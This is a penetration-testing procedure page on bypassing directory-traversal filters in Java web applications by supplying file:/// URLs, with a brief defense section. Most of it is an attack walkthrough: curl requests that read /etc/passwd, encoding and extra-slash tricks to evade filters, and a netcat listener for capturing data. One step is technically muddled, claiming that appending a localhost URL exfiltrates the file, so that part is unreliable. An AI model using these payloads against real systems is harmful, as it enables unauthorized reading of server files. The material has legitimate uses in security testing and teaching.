---
type: procedure
description: >-
  Bypass directory traversal protections in Java web applications using the
  file:/// protocol to access sensitive local files.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[File and Directory Discovery]]'
sub_techniques: []
tags:
  - directory-traversal
  - java
  - bypass
  - file-access
commands:
  - '[[commands/curl-java-dtraversal-bypass]]'
platforms:
  - Java
  - Web
  - Linux
tools: []
validated: true
---

# Java-Bypass-Directory-Traversal

## Summary

The Java Bypass Directory Traversal procedure exploits vulnerabilities in Java-based web applications that inadequately sanitize URL inputs, allowing attackers to use the file:/// protocol to read sensitive local files outside the web root, such as /etc/passwd on Linux systems. This technique is useful in web penetration testing to demonstrate unauthorized file access when standard path traversal filters fail to block protocol-based bypasses.

## Description

In many Java web applications, developers implement filters to prevent directory traversal attacks by blocking sequences like ../ or \.. in URL parameters. However, these filters often overlook the file:/// protocol, which Java's URL handling treats as a valid local file accessor. By submitting a URL parameter containing file:///path/to/sensitive/file, an attacker can trick the application into reading and potentially returning the contents of system files. This is particularly effective against applications using libraries like Apache Commons or custom URL resolvers that do not explicitly validate protocols.

The attack targets endpoints that fetch or process external resources based on user input, such as image loaders, API proxies, or search functions. Success depends on the application's configuration, such as running on a server with access to the file system and insufficient protocol whitelisting. Expected outcomes include retrieval of configuration files, user databases, or system logs, enabling further reconnaissance or privilege escalation.

## Requirements

1. Access to a vulnerable Java web application with an endpoint that processes URL inputs without protocol validation.
2. Knowledge of the target server's file system paths (e.g., /etc/passwd on Linux).
3. Network connectivity to the target application (e.g., via HTTP/HTTPS).
4. Tools like curl for sending crafted requests or a browser for manual testing.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to whitelist only allowed protocols (e.g., http, https) and block file://.
- Use Java SecurityManager or application-level access controls to restrict file system reads from web contexts.
- Monitor application logs and web traffic for anomalous file access patterns or file:/// in request parameters.
- Employ web application firewalls (WAFs) with rules to detect protocol-based traversal attempts.

## Objectives

1. Bypass URL filtering mechanisms to access restricted local files.
2. Retrieve sensitive system information for reconnaissance.
3. Demonstrate the vulnerability to support remediation efforts.

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate an application endpoint that accepts URL parameters for resource fetching, such as a search or proxy feature. Test with benign inputs to confirm it processes external URLs.

Use [[commands/curl-java-dtraversal-bypass]] to send a standard HTTP request:

```bash
curl -X GET "http://target-app.com/vulnerable-endpoint?url=http://example.com" -v
```

> This verifies the endpoint responds without errors to valid URLs, setting the stage for the bypass. Expected output includes a successful HTTP response (200 OK) with fetched content.

### Step 2: Craft and Submit Bypass Payload

**Context**: Replace the URL parameter with the file:/// protocol pointing to a sensitive file. This exploits the lack of protocol checks to force local file access.

Use [[commands/curl-java-dtraversal-bypass]] with the malicious payload:

```bash
curl -X GET "http://target-app.com/vulnerable-endpoint?url=file:///etc/passwd" -v
```

> The application interprets file:///etc/passwd as a local file request, bypassing traversal filters. If successful, the response body contains the file contents. For redirection or chaining, append a legitimate URL like http://127.0.0.1:8080 to exfiltrate data:

```bash
curl -X GET "http://target-app.com/vulnerable-endpoint?url=file:///etc/passwd%20http://127.0.0.1:8080" -v
```

Expected output: HTTP response including lines from /etc/passwd (e.g., root:x:0:0:root:/root:/bin/bash).

### Step 3: Verify and Extract Data

**Context**: Confirm the bypass worked by checking the response for file contents. If the application echoes the fetched data, extract it for analysis; otherwise, use a listener on the redirect URL to capture exfiltrated content.

Monitor the response or a local server (e.g., netcat on port 8080) for incoming data.

> Success is indicated by visible file contents in the response or received on the listener. If blocked, try URL encoding (e.g., file%3A%2F%2F%2Fetc%2Fpasswd) or alternative paths like file:////etc/passwd to evade additional filters.
